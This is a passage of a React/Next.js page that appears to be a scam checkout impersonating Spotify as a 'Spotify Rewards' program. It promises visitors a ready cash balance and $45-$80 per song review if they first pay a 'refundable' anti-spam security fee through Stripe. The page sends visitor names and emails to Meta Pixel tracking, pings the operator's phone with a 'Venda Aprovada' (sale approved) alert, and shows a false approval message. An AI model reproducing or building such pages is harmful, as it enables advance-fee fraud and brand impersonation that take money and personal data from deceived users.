    }).catch((err) => console.warn('Supabase client registration notice:', err));

    // Notify iPhone via Pushcut (Venda Aprovada)
    try {
      fetch('/api/pushcut', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: 'approved', name: fullName, email }),
      }).catch(() => {});
    } catch {}

    // Automatically redirect to /spotify/welcome after 2.5s
    setTimeout(() => {
      router.push('/spotify/welcome');
    }, 2500);
  };

  return (
    <div className="min-h-screen bg-[#070a08] text-[#e0e0e0] font-sans antialiased relative overflow-hidden selection:bg-[#1db954] selection:text-black">
      {/* Meta Pixel & CAPI Checkout Tracker */}
      <MetaPixelTracker
        eventName="InitiateCheckout"
        customData={{
          content_name: 'Anti-Spam Security Pass Checkout',
          value: 9.0,
          currency: 'USD',
        }}
        userData={{
          email,
          full_name: fullName,
        }}
      />
      {/* Background Radial Glow Accent matching reference image */}
      <div className="absolute top-0 left-0 w-full h-[650px] bg-[radial-gradient(ellipse_80%_60%_at_25%_15%,rgba(29,185,84,0.18),rgba(15,35,22,0.45)_50%,transparent_80%)] pointer-events-none -z-10" />

      {/* Ambient green dot grid / subtle noise */}
      <div className="absolute inset-0 bg-[linear-gradient(to_right,#1db95408_1px,transparent_1px),linear-gradient(to_bottom,#1db95408_1px,transparent_1px)] bg-[size:3rem_3rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_0%,#000_70%,transparent_100%)] pointer-events-none -z-10" />

      {/* Top Header / Branding */}
      <header className="max-w-6xl mx-auto px-4 sm:px-6 pt-6 pb-4 flex items-center">
        <Link href="/spotify" className="flex items-center gap-2.5 transition-opacity hover:opacity-90">
          <div className="relative w-8 h-8 rounded-full overflow-hidden bg-black flex items-center justify-center">
            <Image
              src="/spotify-logo.webp"
              alt="Spotify Logo"
              width={32}
              height={32}
              priority
              referrerPolicy="no-referrer"
            />
          </div>
          <div className="flex items-center gap-1.5">
            <span className="text-white font-extrabold text-lg sm:text-xl tracking-tight">Spotify</span>
            <span className="bg-[#1db954] text-black text-[11px] font-black uppercase px-2 py-0.5 rounded-full tracking-wide">
              Rewards
            </span>
          </div>
        </Link>
      </header>

      {/* Main Content: 2-Column Desktop Grid / 1-Column Mobile Stack */}
      <main className="max-w-6xl mx-auto px-4 sm:px-6 py-6 sm:py-10">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 lg:gap-12 items-start">
          {/* ========================================================= */}
          {/* LEFT COLUMN: PROGRAM INFO & BENEFIT HIGHLIGHTS            */}
          {/* ========================================================= */}
          <div className="lg:col-span-6 space-y-6 pt-1">

            {/* Main Heading */}
            <div>
              <h1 className="text-3xl sm:text-4xl md:text-5xl font-black text-white tracking-tight leading-tight">
                Your <span className="text-[#1db954] font-black">{balanceData.formatted}</span> is Ready
              </h1>

              <p className="text-sm sm:text-base text-gray-300 mt-3 leading-relaxed">
                Review your account information and available payment options. Complete listener verification to unlock instant cashout.
              </p>
            </div>

            {/* Verification Pill Badge */}
            <div>
              <span className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-[#0d2215] text-[#1db954] border border-[#1db954]/40 text-xs font-black uppercase tracking-wider">
                <span className="w-2 h-2 rounded-full bg-[#1db954] animate-pulse" />
                INSTANT CASHOUT VERIFICATION
              </span>
            </div>

            {/* Program Checklist Items with Green Checks */}
            <div className="space-y-4 pt-1">
              {/* Item 1 */}
              <div className="flex items-start gap-3.5">
                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
                  <Check className="w-3.5 h-3.5 stroke-[3]" />
                </div>
                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
                  <b className="text-white font-bold">Unlock Full Cashout:</b> Direct deposit of your {balanceData.formatted} to PayPal or Bank Account
                </div>
              </div>

              {/* Item 2 */}
              <div className="flex items-start gap-3.5">
                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
                  <Check className="w-3.5 h-3.5 stroke-[3]" />
                </div>
                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
                  <b className="text-white font-bold">Daily Music Review Batches:</b> Receive up to 10 new songs daily (earn $45-$80 per review)
                </div>
              </div>

              {/* Item 3 */}
              <div className="flex items-start gap-3.5">
                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
                  <Check className="w-3.5 h-3.5 stroke-[3]" />
                </div>
                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
                  <b className="text-white font-bold">Official Verified Listener Badge:</b> Priority payouts with zero processing delays
                </div>
              </div>

              {/* Item 4 */}
              <div className="flex items-start gap-3.5">
                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
                  <Check className="w-3.5 h-3.5 stroke-[3]" />
                </div>
                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
                  <b className="text-white font-bold">100% Refundable Security Fee:</b> Automatically refunded back to your account together with your {balanceData.formatted} balance right after registration
                </div>
              </div>
            </div>

            {/* Bottom Guarantee Row */}
            <div className="pt-4 border-t border-white/5 flex flex-wrap items-center gap-4 sm:gap-6 text-xs text-gray-400 font-medium">
              <div className="flex items-center gap-1.5">
                <Clock className="w-4 h-4 text-[#1db954]" />
                <span>Instant Deposit</span>
              </div>
              <div className="flex items-center gap-1.5">
                <ShieldCheck className="w-4 h-4 text-[#1db954]" />
                <span>Bank-Grade Security</span>
              </div>
              <div className="flex items-center gap-1.5">
                <RefreshCw className="w-4 h-4 text-[#1db954]" />
                <span>100% Refundable</span>
              </div>
            </div>
          </div>

          {/* ========================================================= */}
          {/* RIGHT COLUMN: INTEGRATED CHECKOUT CARD                    */}
          {/* ========================================================= */}
          <div className="lg:col-span-6">
            <div className="rounded-3xl bg-[#0b0e0c] border border-[#1d2520] p-6 sm:p-8 shadow-2xl shadow-black relative backdrop-blur-xl">
              {/* Card Header: Accumulated Balance */}
              <div className="flex items-center justify-between pb-5 border-b border-[#1d2520] mb-6">
                <div>
                  <span className="block text-[11px] font-extrabold uppercase tracking-widest text-[#8a9890]">
                    ACCUMULATED BALANCE
                  </span>
                  <span className="text-xs text-[#8a9890] mt-0.5 block">
                    Ready for release to your account
                  </span>
                </div>
                <div className="text-3xl sm:text-4xl font-extrabold text-[#1db954] tracking-tight">
                  {balanceData.formatted}
                </div>
              </div>

              {/* Order Summary & Pricing Distinction */}
              <div className="mb-6 p-4 rounded-2xl bg-[#111613] border border-[#1f2722] flex items-center justify-between text-xs">
                <div>
                  <span className="font-bold text-white block text-sm">One-Time Anti-Spam Security Pass</span>
                  <span className="text-[#8a9890] text-xs mt-0.5 block">Automatic refund within 1–2 hours</span>
                </div>
                <div className="text-right">
                  <span className="text-base font-bold text-white block">${chargeAmountFormatted} USD</span>
                  <span className="block text-xs text-[#1db954] font-semibold mt-0.5">100% Refundable</span>
                </div>
              </div>

              {/* Render Official Stripe Elements or High-Fidelity Test Mode */}
              {isInitializingPayment ? (
                <div className="py-12 flex flex-col items-center justify-center gap-3 text-gray-400">
                  <RefreshCw className="w-6 h-6 animate-spin text-[#1db954]" />
                  <span className="text-xs">Initializing secure payment gateway...</span>
                </div>
              ) : isStripeLive && clientSecret && stripePromise ? (
                /* Real Stripe Payment Element */
                <Elements
                  stripe={stripePromise}
                  options={{
                    clientSecret,
                    locale: 'en',
                    appearance: {
                      theme: 'night',
                      variables: {
                        colorPrimary: '#1db954',
                        colorBackground: '#131715',
                        colorText: '#ffffff',
                        colorDanger: '#ef4444',
                        fontFamily: 'system-ui, -apple-system, sans-serif',
                        borderRadius: '16px',
                      },
                      rules: {
                        '.Input': {
                          borderColor: '#26312a',
                          backgroundColor: '#131715',
                          padding: '14px 16px',
                        },
                        '.Input:focus': {
                          borderColor: '#1db954',
                        },
                        '.Tab': {
                          borderColor: '#26312a',
                          backgroundColor: '#131715',
                          borderRadius: '16px',
                          padding: '14px',
                        },
                        '.Tab--selected': {
                          borderColor: '#1db954',
                          backgroundColor: '#1db954',
                          color: '#000000',
                        },
                        '.TabIcon--selected': {
                          color: '#000000',
                        },
                        '.TabLabel--selected': {
                          color: '#000000',
                          fontWeight: '700',
                        },
                      },
                    },
                  }}
                >
                  <StripePaymentForm
                    clientSecret={clientSecret}
                    fullName={fullName}
                    setFullName={setFullName}
                    email={email}
                    setEmail={setEmail}
                    country={country}
                    amountFormatted={chargeAmountFormatted}
                    onSuccess={handlePaymentSuccess}
                  />
                </Elements>
              ) : (
                /* High-Fidelity Test & Preview Mode */
                <InteractiveMockPaymentForm
                  fullName={fullName}
                  setFullName={setFullName}
                  email={email}
                  setEmail={setEmail}
                  country={country}
                  setCountry={setCountry}
                  amountFormatted={chargeAmountFormatted}
                  onSuccess={handlePaymentSuccess}
                />
              )}

              {/* Trust & Compliance Footer */}
              <div className="mt-6 pt-5 border-t border-[#1d2520] flex flex-wrap items-center justify-center gap-3 text-[11px] text-[#707e76]">
                <span className="flex items-center gap-1.5">
                  <Lock className="w-3.5 h-3.5 text-[#1db954]" /> 256-Bit SSL Encrypted
                </span>
                <span>•</span>
                <span className="flex items-center gap-1.5">
                  <ShieldCheck className="w-3.5 h-3.5 text-[#1db954]" /> PCI-DSS Compliant
                </span>
                <span>•</span>
                <span>Processed by MM Systems</span>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* ========================================================= */}
      {/* SUCCESS CONFIRMATION MODAL                                */}
      {/* ========================================================= */}
      {paymentSuccess && (
        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
          <div className="max-w-md w-full rounded-3xl bg-[#0e1410] border border-[#1db954]/50 p-6 sm:p-8 text-center shadow-2xl shadow-[#1db954]/20 animate-in fade-in zoom-in-95 duration-200">
            <div className="w-16 h-16 rounded-full bg-[#1db954]/20 text-[#1db954] flex items-center justify-center mx-auto mb-4 border border-[#1db954]/40">
              <CheckCircle2 className="w-10 h-10 stroke-[2.5]" />
            </div>

            <h3 className="text-2xl font-black text-white mb-2">
              Payment &amp; Verification Confirmed!
            </h3>

            <p className="text-sm text-gray-300 mb-4 leading-relaxed">
              Your one-time refundable verification of <b className="text-white">${chargeAmountFormatted} USD</b> was successfully processed.
            </p>

            <div className="p-4 rounded-2xl bg-black/50 border border-white/10 mb-5 text-left space-y-2">
              <div className="flex justify-between text-xs">
                <span className="text-gray-400">Reserved Payout:</span>
                <span className="font-bold text-[#1db954]">{balanceData.formatted} USD</span>
              </div>
              <div className="flex justify-between text-xs">
                <span className="text-gray-400">Verification Status:</span>
                <span className="font-bold text-white">Active &amp; Approved</span>
              </div>
              <div className="flex justify-between text-xs">
                <span className="text-gray-400">Refundable Fee:</span>
                <span className="font-bold text-blue-400">100% Refund in 1–2h</span>
              </div>
            </div>

            <div className="flex items-center justify-center gap-2 text-xs text-gray-400 mb-2">
              <RefreshCw className="w-3.5 h-3.5 animate-spin text-[#1db954]" />
              <span>Redirecting to orientation &amp; onboarding...</span>
            </div>

            <Link
              href="/spotify/welcome"
              className="mt-4 block w-full py-3.5 rounded-full bg-[#1db954] text-black font-extrabold text-sm hover:bg-[#1ed760] transition-colors"
            >
              Continue to Welcome Page →
            </Link>
          </div>
        </div>
      )}

      {/* Global Footer */}
      <footer className="mt-16 border-t border-white/5 py-8 text-center text-xs text-gray-400 space-y-2">
        <p>&copy; {new Date().getFullYear()} Music Rewards Program &bull; Partner Verification Portal.</p>
        <div className="flex items-center justify-center gap-4 text-gray-400">
          <Link href="/politicasdeprivacidade" className="hover:text-gray-300 transition-colors">
            Privacy Policy
          </Link>
          <span>&bull;</span>
          <Link href="/suporte" className="hover:text-gray-300 transition-colors">
            Support Center
          </Link>
        </div>
      </footer>
    </div>
  );
}
